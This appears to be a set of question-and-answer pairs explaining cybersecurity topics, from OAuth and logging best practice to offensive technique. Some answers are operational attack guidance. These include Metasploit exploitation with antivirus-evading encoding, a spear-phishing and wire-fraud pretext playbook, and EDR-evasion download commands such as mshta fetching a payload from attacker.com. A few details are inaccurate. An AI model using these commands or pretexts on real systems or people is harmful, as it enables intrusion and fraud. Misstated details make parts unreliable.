Explain common cryptographic vulnerabilities and how to exploit them.

Common crypto vulnerabilities: (1) ECB mode -- Electronic Codebook encrypts each block independently with same key; identical plaintext blocks produce identical ciphertext; ECB penguin (encrypt Linux Tux image -- shape visible in ciphertext); exploit: if application encrypts username in ECB, craft username where first block is all spaces padded and second block contains 'admin'; rearrange blocks to elevate privileges. Use CBC or GCM instead. (2) Padding oracle -- CBC mode decryption errors reveal whether plaintext padding is valid (PKCS#7); attacker flips bits in ciphertext; oracle (timing difference, error message) reveals if padding valid; allows byte-by-byte decryption without key; POODLE (SSLv3), PaDED, CBC padding oracle attacks. Exploit: padbuster tool. Fix: use authenticated encryption (AES-GCM) -- padding error impossible. (3) Length extension attack -- SHA-1, SHA-256, MD5 have Merkle-Damgard construction; if MAC = hash(secret + message), attacker can append data and compute valid MAC without knowing secret; affects naive HMAC implementations. Fix: use HMAC properly (nested construction) or SHA-3/BLAKE2. (4) Timing attacks -- if string comparison is not constant-time, attacker measures response time to guess HMAC byte by byte (early exit on mismatch). Fix: use hmac.compare_digest() (Python) or crypto.timingSafeEqual() (Node.js). (5) Weak random -- rand() in C, Math.random() in JavaScript are not cryptographically secure; predictable seed leads to predictable values; use /dev/urandom (Linux), CryptGenRandom (Windows), secrets module (Python), crypto.getRandomValues() (browser). (6) Reused nonce in GCM -- two messages encrypted with same (key, nonce) pair allows recovery of keystream and authentication key; catastrophic. Fix: use random 96-bit nonce (collision probability negligible for <2^32 messages per key).
How does PKI work and how can it be attacked?

PKI (Public Key Infrastructure) provides trust for TLS, code signing, email encryption. Components: (1) Root CA -- self-signed certificate; trust anchor in OS/browser trust stores; kept offline (air-gapped) for security; Root CA signs Intermediate CA certificates. (2) Intermediate CA -- online CA that signs end-entity (leaf) certificates; compromise of Intermediate CA is recoverable (revoke the Intermediate); certificate chain: leaf -> intermediate -> root. (3) Certificate: contains subject DN, subject public key, issuer (CA), validity period, SANs (Subject Alternative Names -- additional hostnames), key usage, extended key usage, serial number; CA signature over all fields. (4) Validation: TLS client receives server cert; verifies chain to trusted root; checks expiry; checks revocation (CRL -- Certificate Revocation List, or OCSP -- Online Certificate Status Protocol); verifies server hostname matches SAN. PKI attacks: (1) Rogue CA -- DigiNotar compromise 2011; attacker issued certs for google.com; used for MITM in Iran; root revoked by all browsers -- catastrophic. (2) Certificate misissuance -- CA issues cert for domain without proper validation; e.g., StartCom issued *.github.com without authorization. (3) Private key theft -- steal private key from web server; impersonate server without CA knowledge until cert expires; forward secrecy (ECDHE) prevents past session decryption even if private key stolen. (4) CT log poisoning -- Certificate Transparency logs all issued certs publicly; monitors detect misissuance. (5) Weak validation -- DV (Domain Validation) certs only verify domain control (email or DNS challenge); EV (Extended Validation) requires legal entity verification but browsers removed EV UI. Defense: HPKP deprecated; CT monitoring (SSLMate); short cert lifetimes (Let's Encrypt 90 days); ACME automation.
Explain OAuth 2.0 security best practices for implementing an authorization server.

OAuth 2.0 authorization server security (RFC 6819 threat model): (1) PKCE (Proof Key for Code Exchange) -- mandatory for all clients (not just public clients); generates code_verifier (random 43-128 char string); code_challenge = BASE64URL(SHA256(code_verifier)); sent request; server verifies code_verifier in token request; prevents authorization code interception. (2) Redirect URI exact matching -- validate redirect_uri against registered exact URIs (not prefix match or regex); open redirect attacks use lax validation to leak auth code to attacker-controlled URI. (3) State parameter -- validate that state matches between request and callback; prevents CSRF; use cryptographically random value, store in session. (4) Short-lived authorization codes -- auth codes expire in 10 minutes; single-use (invalidate after first use); authorization code injection prevents reuse attack. (5) Token security -- access tokens: JWT (stateless) or opaque (stateful); short lifetime (15-60 minutes); refresh tokens: longer lifetime but must be stored securely (server-side for confidential clients, only if HttpOnly cookie for SPAs); refresh token rotation (each use issues new RT, invalidates old -- detects theft). (6) Client authentication -- confidential clients authenticate with client_secret (HTTP Basic or POST body); use asymmetric keys (private_key_jwt) for stronger assurance. (7) Scope minimisation -- issue tokens with only requested and approved scopes; user explicitly consents to each scope. (8) Token binding -- bind tokens to sender's TLS certificate (mTLS) to prevent stolen token reuse. (9) Introspection and revocation endpoints -- allow resource servers to validate tokens and admins to revoke compromised tokens. Follow RFC 9700 (Security BCP for OAuth 2.0) for current guidance.
Explain Zero Trust Architecture principles and implementation.

Zero Trust Architecture (NIST SP 800-207) rejects the implicit trust of perimeter-based security ('trust but verify' -> 'never trust, always verify'). Core tenets: (1) All resources accessed securely regardless of location -- no difference between on-premises and remote access; every request authenticated and authorised. (2) Least-privilege access -- minimum permissions necessary, just-in-time (JIT) access, just-enough access (JEA); no standing privileged access. (3) Verify explicitly -- authenticate and authorise based on all available signals: user identity (MFA), device health (compliant, patched, managed), location, time, request characteristics; dynamic risk-based policy. (4) Assume breach -- segment network (microsegmentation); limit blast radius; log and inspect all traffic; hunt for attackers already inside. Implementation pillars (CISA ZT Maturity Model): (1) Identity -- strong MFA everywhere; passwordless where possible; privileged identity management (PIM/PAM); Continuous Access Evaluation (CAE -- revoke tokens on risk events without waiting for expiry). (2) Device -- MDM/EDR enrollment; device compliance as access condition; certificate-based device identity. (3) Network -- microsegmentation (east-west traffic filtered at workload level, not just network perimeter); software-defined perimeter; replace VPN with ZTNA (Cloudflare Access, Zscaler Private Access, BeyondCorp). (4) Application -- per-application access policies; application proxy (no network-level access); WAAP (Web Application and API Protection). (5) Data -- data classification; DLP; encrypt at rest and in transit; information rights management. Monitoring: SIEM + UEBA; baseline normal behaviour per user/device; alert on deviations.
Walk through a full external network penetration test methodology.

External network penetration test (black-box, internet-facing): SCOPE AND RULES: confirm scope (IP ranges, domains), test window (24/7 or business hours), emergency contacts, out-of-scope systems (production databases, third-party systems). PHASE 1 -- RECONNAISSANCE: passive OSINT: crt.sh, Shodan, SecurityTrails, GitHub, LinkedIn, job postings, Google dorks; active: subdomain enumeration (subfinder, amass), port scanning: masscan -p1-65535 --rate=10000 SCOPE -> nmap -sV -sC -A specific targets. PHASE 2 -- ENUMERATION: web apps: httpx identifies live HTTP/S; tech fingerprinting (Wappalyzer, WhatWeb); crawl with Burp Suite spider; API discovery (common paths, Swagger/OpenAPI); CMS fingerprinting (wpscan for WordPress, droopescan for Drupal). PHASE 3 -- VULNERABILITY IDENTIFICATION: automated scan: Nessus or OpenVAS; manual: test each web app systematically (OWASP Testing Guide); check for CVEs in identified software versions; test authentication (default creds, brute force, MFA bypass). PHASE 4 -- EXPLOITATION: exploit confirmed vulnerabilities (not just potential); establish foothold; demonstrate impact (access to sensitive data, privilege escalation); pivot to additional systems only if in scope. PHASE 5 -- POST-EXPLOITATION: from foothold: enumerate internal network, dump credentials, lateral movement (only in scope); demonstrate business impact (access PII, financial data, admin panels). PHASE 6 -- REPORTING: executive summary (risk, business impact -- non-technical); technical findings (vulnerability title, CVSS score, evidence/PoC, remediation steps); prioritised by risk; CVSS scoring; remediation retest offer. Deliverables: report + raw tool output (Nessus XML, Burp state) + scope documentation.
Explain Metasploit framework usage for penetration testing.

Metasploit Framework (MSF) is the most widely used exploitation framework. Core components: msfconsole (interactive shell), modules (exploits, payloads, auxiliary, post, encoders, nops). Workflow: (1) Search: search type:exploit platform:windows SMB EternalBlue; search name:ms17-010. (2) Use module: use exploit/windows/smb/ms17_010_eternalblue. (3) Show options: show options -- required: RHOSTS (target), LHOST (your IP), LPORT; set RHOSTS 192.168.1.100; set LHOST tun0; set LPORT 4444. (4) Select payload: show payloads; set payload windows/x64/meterpreter/reverse_tcp. (5) Run: exploit or run. Meterpreter commands: sysinfo; getuid; getsystem (attempt privilege escalation); hashdump (dump SAM -- requires SYSTEM); ps (list processes); migrate PID (migrate to more stable process); shell (drop to cmd.exe); upload/download files; portfwd add -l 3389 -p 3389 -r TARGET (port forward RDP through Meterpreter). Post-exploitation modules: use post/windows/gather/credentials/credential_collector; use post/multi/recon/local_exploit_suggester (finds local privesc opportunities); use post/windows/manage/enable_rdp. Auxiliary modules: use auxiliary/scanner/smb/smb_login (SMB credential testing); use auxiliary/scanner/ssh/ssh_login; use auxiliary/scanner/http/dir_scanner. Evasion: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/xor_dynamic -i 5 -f exe (encode to evade static AV); use stageless payloads; process migration to signed process.
Explain spear phishing techniques and how to run an effective campaign.

Spear phishing is targeted phishing using personalised content to increase success rates. Reconnaissance for targeting: LinkedIn (job role, projects, team structure, reporting lines, used tools), company website (email format: firstname.lastname@company.com), GitHub (email in commits), breach databases (personal info for rapport). Pretext construction: (1) IT helpdesk -- 'Your account requires MFA re-enrollment due to a security policy update. Click here: [phishing URL]'; urgent, from IT, familiar request. (2) Executive impersonation (BEC) -- spoof CEO email to CFO: 'I need an urgent wire transfer for a confidential acquisition. Call me before telling anyone.'; impersonate using display name and typosquatted domain. (3) Vendor invoice fraud -- spoof known vendor with slightly different domain; send invoice with changed bank details. (4) Job offer (watering hole) -- post fake job offer; LinkedIn InMail from fake recruiter; send 'skills assessment' document with malicious macro. Technical components: (1) Domain: register typosquatted domain (company.com -> compаny.com with Cyrillic а, or conpany.com); age the domain 2+ weeks before use; set up SPF/DKIM/DMARC for deliverability. (2) Infrastructure: GoPhish open-source phishing framework; creates email templates, tracks clicks and credentials; sends through SMTP relay. (3) Payload: credential harvester (Evilginx2 -- reverse proxy that captures real credentials and MFA tokens by proxying legitimate login pages -- MFA-resistant phishing); or macro-enabled document. Metrics: report click rate, credential submission rate, report-to-IT rate; use to measure and improve security awareness training effectiveness.
What are common EDR evasion techniques used by red teams?

EDR (Endpoint Detection and Response) evasion techniques: (1) Direct syscalls -- EDR hooks user-mode APIs (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx in ntdll.dll); bypass by calling syscalls directly using syscall stub from ntdll (Hell's Gate technique) or hardcoded syscall numbers (Syswhispers); hooks in ntdll are bypassed entirely. (2) Unhooking ntdll -- load a clean copy of ntdll.dll from disk or KnownDlls and replace hooked functions with clean ones; EDR hooks in memory removed. (3) Early-bird APC injection -- inject shellcode into a suspended process via APC before threads run; API calls less scrutinised at process creation. (4) Obfuscation -- XOR/RC4 encrypt shellcode in binary; decrypt at runtime; polymorph to avoid static signature match; sleep obfuscation encrypts memory during sleep. (5) Living-off-the-land (LOLBAS) -- use signed Windows binaries: certutil -urlcache -f URL payload.exe; bitsadmin /transfer job URL C:\payload; regsvr32 /s /n /u /i:URL scrobj.dll; mshta http://attacker.com/payload.hta -- signed binaries trusted more than unknown executables. (6) Process injection into signed process -- inject into Explorer.exe, teams.exe, OneDrive.exe; EDR anomaly detection less aggressive on signed/trusted processes. (7) Cobalt Strike malleable C2 -- mimic legitimate application traffic (Amazon browsing, Slack API); custom HTTP headers, URIs, useragents; no standard beacon pattern. (8) PPL bypass -- Protected Process Light prevents EDR memory reads from non-PPL processes; PPLdump exploits Windows driver to get PPL context. (9) ETW (Event Tracing for Windows) patching -- patch EtwEventWrite in amsi.dll and ntdll.dll to prevent telemetry; AMSI patching blinds script-based detection.
Explain how to perform network packet analysis with Wireshark.

Wireshark packet analysis for security: Capture filters (BPF syntax, applied during capture -- efficient): host 192.168.1.100; port 80 or port 443; tcp and not port 22; net 10.0.0.0/8. Display filters (applied after capture -- flexible): http.request.method == 'POST' (find form submissions); dns.qry.name contains 'suspicious' (DNS queries); tcp.flags.syn == 1 and tcp.flags.ack == 0 (SYN scan detection); ip.src == 192.168.1.100; frame contains 'password'. Analysis techniques: (1) Follow TCP stream -- right-click packet -> Follow -> TCP Stream; sees entire conversation in plaintext (HTTP, Telnet, FTP, unencrypted protocols); credential capture. (2) Export objects -- File -> Export Objects -> HTTP; extracts files transferred over HTTP (executables, documents). (3) Statistics -> Conversations -- find top talkers; large data transfers to external IPs (exfiltration indicator). (4) Statistics -> Protocol Hierarchy -- shows breakdown of traffic types; unusual protocol (IRC, Tor, custom) stands out. (5) Detect port scanning -- Statistics -> IO Graphs; spike in SYN packets; display filter: tcp.flags == 0x002 | stats by src. (6) Credential extraction -- filter: ftp || pop || imap || http.authorization; FTP USER/PASS in plaintext; HTTP Basic auth base64-decoded. (7) TLS analysis -- even for encrypted HTTPS: see certificate details (server identity, CA); detect outdated TLS versions (ssl.handshake.version == 0x0301 = TLS 1.0). (8) Detect ARP spoofing -- display filter: arp.duplicate-address-detected; see multiple MAC addresses claiming same IP. tshark (CLI Wireshark) for scripted analysis: tshark -r capture.pcap -T fields -e ip.src -e dns.qry.name -Y 'dns'.
How do you perform firewall evasion during a penetration test?

Firewall evasion techniques: (1) Fragmentation -- split packets into fragments smaller than firewall can reassemble; nmap -f (8-byte fragments); --mtu 16 (custom MTU); stateful firewalls reassemble fragments so this mainly bypasses stateless ACLs. (2) Source port spoofing -- some firewalls allow traffic from port 80, 443, 53 (trusted services); nmap --source-port 53; nc --source-port 53 TARGET PORT. (3) Decoy scanning -- nmap -D RND:10 TARGET (sends scans from 10 random decoys + real IP); firewall logs flooded with noise; hard to identify real attacker. (4) Slow scan -- nmap -T1 --scan-delay 5s; IDS rate-based detection misses slow port scans. (5) Protocol tunneling -- encapsulate traffic in allowed protocols; iodine (DNS tunneling -- DNS queries carry data -- port 53 almost always allowed outbound); HTTPTunnel (HTTP); ncat through HTTP proxy. (6) IPv6 -- many firewalls focus on IPv4; if IPv6 enabled on target but not filtered: scan over IPv6: nmap -6 TARGET_IPv6. (7) Payload encoding -- evade content inspection; base64-encoded payloads in HTTP; XOR-encoded shellcode. (8) Application-layer mimicry -- C2 traffic mimics legitimate applications (HTTPS browsing, DNS, Slack API); domain fronting routes through trusted CDNs. (9) Idle scan (zombie scan) -- nmap -sI ZOMBIE_IP TARGET; no packets sent directly to target; uses zombie's IP ID field to infer open ports; scanner's IP never appears in target logs. (10) Split handshake -- some firewall implementations confused by unusual TCP flag combinations; used in historical FW evasion (FIN scan: nmap -sF on non-Windows targets without firewall; Xmas scan: -sX; Null scan: -sN).
Explain fuzzing methodology for finding vulnerabilities.

Fuzzing automatically generates and sends malformed inputs to find crashes and vulnerabilities. Types: (1) Black-box -- no source access; generate inputs based on format knowledge or mutation; fast to set up, less thorough. (2) Grey-box (coverage-guided) -- instrument binary to measure code coverage; mutation engine evolves inputs that exercise new code paths; most effective; AFL++ and LibFuzzer are examples. (3) White-box -- source available; symbolic execution or taint analysis guides input generation; most thorough, slowest. AFL++ (American Fuzzy Lop++) workflow: (a) Compile target with instrumentation: CC=afl-cc CXX=afl-c++./configure && make; (b) Create corpus of valid inputs (seed files); (c) Run fuzzer: afl-fuzz -i corpus/ -o findings/ --./target @@; (d) AFL mutates inputs, monitors for crashes (SIGSEGV, SIGABRT); (e) Crashes saved in findings/crashes/; (f) Triage crashes: afl-triage or manual debugging to find unique bugs. LibFuzzer for library fuzzing: write fuzz target function LLVMFuzzerTestOneInput(const uint8_t *data, size_t size); compile with -fsanitize=fuzzer,address; run./fuzz_target corpus/; AddressSanitizer (ASan) catches heap overflows, use-after-free, buffer overruns that don't crash immediately. Network fuzzing: Boofuzz for protocol fuzzing; define request structure; fuzz fields; monitor target for crashes/anomalies. Web fuzzing: ffuf, wfuzz for HTTP parameter/path fuzzing; feroxbuster for directory discovery. Coverage tracking: kcov, lcov; aim for >80% code coverage for thorough fuzzing. Corpus minimisation: afl-cmin removes redundant seeds while maintaining coverage.
What is a heap overflow and how do modern exploits leverage the heap?

Heap overflows occur when writing beyond the bounds of a heap-allocated buffer, corrupting adjacent heap metadata or objects. Modern heap exploitation is more complex than stack overflows due to heap managers (ptmalloc in glibc, jemalloc in Firefox, libmalloc on macOS). Core ptmalloc concepts: chunks (allocated or free); each chunk has header with size and flags; free chunks in bins (unsorted, small, large, tcache); metadata corruption leads to arbitrary write. Classic techniques (now largely mitigated): (1) Unlink attack -- corrupt chunk's fd/bk pointers; when chunk unlinked from freelist during malloc/free: write primitive at arbitrary address. Mitigated by safe-unlinking (checks fd->bk == chunk and bk->fd == chunk). (2) Fastbin attack -- tcache/fastbin singly-linked freelist; poison the fd pointer of a free chunk to point to target address; next malloc of same size returns target address as allocated chunk. (3) Tcache poisoning (glibc ≥ 2.26) -- tcache is per-thread cache; free chunk has fd pointer to next free chunk; overwrite fd with target - sizeof(header); malloc returns target address; write arbitrary data. Mitigated by tcache key (glibc 2.29+) and safe-linking (ptr >> 12 XOR mangled) in glibc 2.32+. (4) House of series -- House of Spirit (forge fake chunk on stack/heap, free it, malloc returns controlled memory); House of Force (old, corrupts top chunk size). Modern heap exploitation: requires leaking heap and libc addresses (heap info-leak first); ASLR means addresses unknown; combine with use-after-free (UAF) or type confusion bugs; target vtable pointers (C++ object method dispatch) or function pointers on heap.
How do you design a secure API?

Secure API design principles: (1) Authentication -- every endpoint requires authentication (except intentionally public endpoints); use OAuth 2.0 with JWT or opaque tokens; API keys for machine-to-machine with key rotation; avoid HTTP Basic auth over the wire. (2) Authorisation -- check on every request: does this user have permission to access THIS resource? Not just 'is user logged in'; implement RBAC or ABAC; validate resource ownership (prevent IDOR). (3) Input validation -- validate all inputs: type (int not string), range (age: 0-150), format (UUID regex), length limits (username: 3-30 chars); reject unknown fields (strict schema); use JSON Schema or Pydantic/marshmallow for automatic validation. (4) Rate limiting -- by user and by IP; different limits for different endpoints (login: 5 attempts/min; search: 100/min; bulk operations: 10/min); return 429 Too Many Requests with Retry-After header; use Redis for distributed rate limiting counter. (5) Output -- never return more than needed (no password hashes, internal IDs, implementation details in response); use response DTOs/schemas that whitelist returned fields. (6) Error handling -- generic error messages to clients (don't leak stack traces, SQL errors, internal paths); log detailed errors server-side with correlation ID; return correlation ID to client for support. (7) HTTPS only -- HSTS (Strict-Transport-Security: max-age=31536000; includeSubDomains); no HTTP fallback. (8) Versioning -- /api/v1/ allows graceful deprecation; support multiple versions during transition. (9) CORS -- whitelist exact allowed origins; don't use wildcard (*) for APIs requiring authentication. (10) Audit logging -- log all state-changing operations with user, timestamp, before/after values, client IP; immutable audit trail for forensics.
How do you implement defence-in-depth for a web application?

Defence-in-depth applies multiple security controls at each layer so no single failure leads to compromise: NETWORK LAYER: (1) WAF (Web Application Firewall) -- Cloudflare, AWS WAF, ModSecurity; blocks known attack patterns (SQLi, XSS, common exploits); rate limiting; bot detection; not a substitute for secure code but catches exploitation attempts. (2) DDoS protection -- Cloudflare Magic Transit, AWS Shield; absorbs volumetric attacks. (3) Network segmentation -- web tier -> app tier -> data tier separated by security groups/firewalls; database only accessible from app servers (not internet). APPLICATION LAYER: (4) Input validation and output encoding (prevents injection and XSS). (5) Authentication and session management -- MFA, secure session cookies (HttpOnly, Secure, SameSite=Strict), session timeout. (6) Authorisation checks on every request. (7) CSRF protection -- SameSite cookies + CSRF tokens. (8) Security headers -- CSP, HSTS, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin. DATA LAYER: (9) Parameterised queries (prevents SQLi). (10) Encryption at rest (AES-256 for sensitive data, bcrypt/Argon2 for passwords). (11) Database least privilege -- app account has only SELECT/INSERT/UPDATE on needed tables; no DROP, CREATE, GRANT. OPERATIONAL: (12) Dependency management -- patch and update regularly; dependency scanning. (13) Secret management -- secrets from vault/env, not in code. (14) Logging and monitoring -- detect attacks in progress; alert on anomalies (failed auth spikes, unusual query patterns). (15) Incident response plan -- when (not if) breach occurs, have playbook ready.
How do you build an effective security awareness training programme?

Security awareness training (SAT) programme design: ASSESSMENT: (1) Baseline phishing simulation -- send phishing email to all employees (no warning); measure: click rate, credential submission rate, report rate; segment by department, seniority, tenure. (2) Knowledge assessment -- quiz on security policies; identify knowledge gaps per group. TRAINING DESIGN: (3) Role-based curriculum -- IT/DevOps: secure coding, cloud security, patch management; Finance: BEC fraud, wire transfer verification, CEO impersonation; Executives: targeted spear phishing, board-level risks; General staff: phishing recognition, password hygiene, data handling, reporting. (4) Engaging content -- short (5-10 min) modules; avoid long annual compliance video; microlearning with immediate feedback; gamification (leaderboards, badges); real-world examples from news. (5) Simulated phishing -- ongoing monthly simulations; rotate pretexts (IT helpdesk, HR, package delivery, finance); immediate teachable moment if clicked (short remedial training, not punishment); track improvement over time. (6) Reporting culture -- make reporting easy (one-click Phish Alert Button in Outlook/Gmail); celebrate reporters, not just those who didn't click; psychological safety: not reporting a click is worse than clicking. METRICS: (7) Click rate over time (target: <5%); credential submission rate; report rate (higher is better); time to report. REINFORCEMENT: (8) Monthly security newsletters; security champions in each department; simulated phishing before high-risk periods (tax season, elections, major events attackers leverage). Platforms: KnowBe4, Proofpoint Security Awareness Training, Cofense; all include simulation + LMS.
How do you use OSINT to investigate a threat actor?

Threat actor OSINT investigation: (1) Seed IOCs from incident -- C2 IP addresses, malware hashes, domain names, email addresses, usernames. (2) IP pivot -- VirusTotal: search IP; show all domains that resolved to it; associated files; detection ratio. Shodan: what services are running, when first seen, SSL cert SANs; censys.io: certificate history; IPinfo.io: ASN, registrar, hosting provider (determine if bulletproof hosting). (3) Domain pivot -- VirusTotal domain report: passive DNS, subdomains, associated files, referrer files; SecurityTrails: current/historical DNS records, registrant email; DomainTools Iris: registrant info, linked domains via registrant email/phone/NS records. (4) Email address pivot -- HaveIBeenPwned (in which breaches); Hunter.io (find associated names); check if email is used on forums; Google the email address. (5) Username pivot -- Sherlock: sherlock username (searches 300+ social platforms); WhatsMyName.app; check hacker forums, paste sites, GitHub, GitLab, coding platforms. (6) Malware pivot -- VirusTotal hash: relations tab (contacted IPs/domains, dropped files, sibling samples); MalwareBazaar: download sample, metadata; Any.run: dynamic analysis for more IOCs; Triage sandbox; hunt for similar samples: VT search by YARA rule or imphash. (7) Infrastructure pivot -- look for patterns: same SSL cert thumbprint across IPs; same registrar, registration dates, hosting provider; same HTTP server banner; create infrastructure map with Maltego. (8) Dark web -- Tor2web proxies for non-Tor access; search paste sites (Pastebin, Ghostbin) for leaked data or communications. Document findings in a structured threat report with confidence levels.
How do you perform mobile application penetration testing on Android?

Android app penetration testing methodology: SETUP: (1) Root device or use emulator (AVD); install Frida server on device; install Burp CA cert for HTTPS interception; configure proxy. (2) Get APK: adb shell pm list packages; adb pull $(adb shell pm path com.target.app | cut -d: -f2). STATIC ANALYSIS: (3) Decompile: apktool d app.apk (resources + smali); jadx -d output app.apk (Java source); unzip app.apk && dex2jar classes.dex && jd-gui classes-dex2jar.jar. (4) Analyze AndroidManifest.xml: exported activities/services/providers (android:exported=true without permissions = accessible to other apps); permissions requested; debuggable flag (android:debuggable=true = extract data and debug). (5) Search code: grep -rn 'http://' -- cleartext URLs; grep -rn 'API_KEY\|SECRET\|PASSWORD' -- hardcoded credentials; grep -rn 'MODE_WORLD_READABLE\|MODE_WORLD_WRITEABLE' -- insecure file permissions; WebView with addJavascriptInterface (JavaScript bridge to Java = XSS-to-native code execution). (6) Check local storage: adb shell (or root); cat /data/data/com.target/shared_prefs/*.xml; look in databases/, files/, cache/ for sensitive data stored insecurely. DYNAMIC ANALYSIS: (7) HTTPS interception: configure proxy in device WiFi settings; add Burp CA as system CA (root required); if certificate pinning, bypass with Frida: objection -g com.target.app explore -> android sslpinning disable. (8) Frida hooking: frida -U -f com.target.app -l script.js; hook decryption functions to extract keys; hook login to see plaintext credentials. (9) Drozer for component testing: drozer console connect; run app.activity.start --component com.target exported.ActivityName (check access controls); run scanner.provider.injection (content provider SQLi). (10) Root detection bypass: objection android root disable.
Explain how to conduct a security risk assessment.

Security risk assessment process (NIST SP 800-30): STEP 1 -- PREPARE: define purpose (compliance, programme prioritisation), scope (systems, processes, organisational units), assumptions and constraints, risk model (likelihood × impact). STEP 2 -- IDENTIFY THREAT SOURCES AND EVENTS: Threat sources: adversarial (nation-state, criminal, insider, hacktivist), accidental (user error, hardware failure), environmental (power failure, flood). Threat events: unauthorised access, malware infection, DDoS, data exfiltration, ransomware, physical theft. STEP 3 -- IDENTIFY VULNERABILITIES: technical (unpatched systems, misconfigurations from Nessus/Tenable), process (no change management, poor password policy), people (low security awareness). STEP 4 -- DETERMINE LIKELIHOOD: Threat source capability × threat source intent × vulnerability severity; qualitative scale: Very High / High / Moderate / Low / Very Low. STEP 5 -- DETERMINE IMPACT: Harm to mission, assets, individuals, other organisations; consider confidentiality (data exposure), integrity (data corruption), availability (service disruption); qualitative: Very High / High / Moderate / Low / Very Low. STEP 6 -- DETERMINE RISK: Risk = f(likelihood, impact); heat map / risk matrix; prioritise High and Very High risks for treatment. STEP 7 -- COMMUNICATE RESULTS: executive summary with top risks; heat map; risk register with owner, risk rating, treatment plan, residual risk, acceptance date. STEP 8 -- MAINTAIN: review risk register quarterly; re-assess after major changes; track treatment plan progress. Risk treatment options: Mitigate (implement controls); Accept (document and accept residual risk with executive sign-off); Transfer (insurance, contractual); Avoid (stop the risky activity).
Explain GDPR requirements and the implications for security teams.

GDPR (General Data Protection Regulation) -- EU data privacy law effective May 2018, applies to any organisation processing EU residents' data. Key requirements for security: (1) Article 25 -- Data Protection by Design and Default: security built into systems from the start; only necessary data collected and processed; privacy-enhancing technologies (pseudonymisation, encryption). (2) Article 32 -- Security of Processing: implement appropriate technical and organisational measures; pseudonymisation and encryption of personal data; ability to ensure ongoing confidentiality, integrity, availability and resilience; ability to restore data after incident; regular testing and assessment of effectiveness. (3) Article 33 -- Breach Notification to Supervisory Authority: within 72 hours of becoming aware of breach; content: nature of breach, categories and approximate number of data subjects affected, likely consequences, measures taken or proposed; if >72 hours, include reason for delay. (4) Article 34 -- Communication to Data Subjects: if breach likely results in high risk to individuals' rights and freedoms: notify affected individuals without undue delay; clear plain language; include nature, DPO contact, likely consequences, measures. Security implications: (a) Maintain records of processing activities (ROPA) listing data types, purposes, retention periods; (b) Data Protection Impact Assessment (DPIA) for high-risk processing; (c) Appoint DPO if large-scale processing or public authority; (d) Vendor management: DPA (Data Processing Agreement) with all processors (cloud providers, SaaS vendors); (e) Data subject rights: implement processes to honour access, rectification, erasure ('right to be forgotten'), portability requests within 30 days. Penalties: up to €20M or 4% of global annual turnover, whichever higher.
How does DNS over HTTPS (DoH) affect security monitoring?

DNS over HTTPS (DoH) encrypts DNS queries inside HTTPS traffic to a DoH resolver (Cloudflare 1.1.1.1, Google 8.8.8.8, or company's own resolver). Security implications: (1) Loss of DNS visibility for defenders -- traditional DNS monitoring (SIEM watching port 53 traffic) is bypassed; DNS-based C2 (C2 using DNS queries for command delivery) becomes invisible if using DoH; defenders cannot see domain lookups to detect malware C2 or phishing site visits at network level. (2) Attacker advantage -- malware can use DoH to resolve C2 domains; traffic blends with HTTPS to legitimate DoH providers; signature-based DNS filtering fails. (3) Bypass of DNS-based security controls -- enterprise DNS sinkholes, DNS RPZ (Response Policy Zones), parental controls, threat intel feeds all rely on controlling DNS resolution; DoH clients that use external resolvers bypass these. Defensive responses: (1) Detect DoH by IP -- block known DoH resolver IPs (Cloudflare, Google, Quad9 IP ranges) at firewall for corporate devices; force all DNS through corporate resolver. (2) Inspect traffic -- TLS SNI reveals destination domain (1.1.1.1, dns.google) even in encrypted traffic; ESNI/ECH further hides SNI. (3) Endpoint DNS control -- use MDM to configure DNS settings on corporate devices; prevent user DoH configuration. (4) Corporate DoH -- deploy Cloudflare Gateway or NextDNS for business: DoH from endpoint to corporate resolver (encrypted) but corporate resolver applies filtering policies; best of both worlds. (5) Monitor for DoH bypass: network anomaly detection for HTTPS traffic to known DoH IPs on non-standard ports.
Explain how a hardware security module (HSM) works and when to use one.

HSM (Hardware Security Module) is a physical computing device that safeguards cryptographic keys and performs cryptographic operations. Key properties: (1) Tamper resistance -- HSM is physically hardened; attempts to open it trigger key zeroisation; tamper-evident seals, mesh of sensors; FIPS 140-2/140-3 Level 2 (tamper-evident) and Level 3/4 (tamper-responsive) certification. (2) Key never leaves HSM -- private keys generated inside HSM and never exported in plaintext; cryptographic operations (sign, decrypt, generate) performed inside HSM; even with full software compromise of the application server, keys are safe. (3) Audit logging -- HSM logs all operations with timestamps; who used which key, when; cryptographic audit trail. Usage scenarios: (1) PKI CA root and intermediate key protection -- CA private key stored in HSM; only HSM can sign certificates; root CA HSM kept air-gapped in safe. (2) TLS private key protection -- web server's TLS private key in HSM; if server is compromised, attacker cannot steal private key; used by high-security sites. (3) Code signing -- software vendor HSM holds code signing key; prevents key theft leading to supply chain attack. (4) Payment processing -- PCI DSS requires HSMs for PIN encryption (PIN entry device HSMs), card data encryption (payment HSMs), key management. (5) Database encryption key management -- master encryption keys in HSM; application requests decryption of data encryption keys from HSM; protects against DBA key theft. Types: network-attached HSM (Thales Luna, nCipher nShield); cloud HSM (AWS CloudHSM, Azure Dedicated HSM, Google Cloud HSM); payment HSM (Thales payShield). API: PKCS#11 (standard interface); JCE provider; Microsoft CNG.
How do you implement secure logging and what should you log?

Secure logging strategy: WHAT TO LOG: (1) Authentication events -- login success (user, IP, timestamp, method); login failure (user, IP, failure reason, MFA status); MFA events (MFA prompt, success/failure, bypass); logout; session expiry. (2) Authorisation -- access denied events (who, what resource, why denied); privilege escalation; role changes. (3) Data access -- access to sensitive data (PII, financial, health) especially bulk reads; export operations; report generation. (4) State changes -- create/update/delete operations with before/after values (who changed what when); configuration changes; security control changes (firewall rules, IAM policies). (5) System events -- service start/stop; process execution; scheduled task creation; new user/group creation. (6) Security events -- IDS/IPS alerts; WAF blocks; vulnerability scan activity; certificate errors. LOGGING SECURITY: (7) Tamper resistance -- send logs to a separate system immediately; SIEM ingestion in real-time; use append-only storage (write once read many -- WORM); sign log entries with HMAC to detect tampering. (8) Completeness -- log the 5 Ws: Who (user, IP), What (action, resource), When (timestamp with timezone), Where (system/component), Result (success/failure). (9) No sensitive data in logs -- do not log passwords (even failed attempts), full credit card numbers, session tokens, plaintext PII where avoidable; log masked versions (last 4 digits of card). (10) Retention -- GDPR: retain only as long as needed for purpose; PCI DSS: 12 months; SOC 2: typically 1 year; HIPAA: 6 years; define per-log-type retention policy. (11) Monitoring -- send to SIEM; create alerts for high-value events (admin login at 3AM, bulk data export, 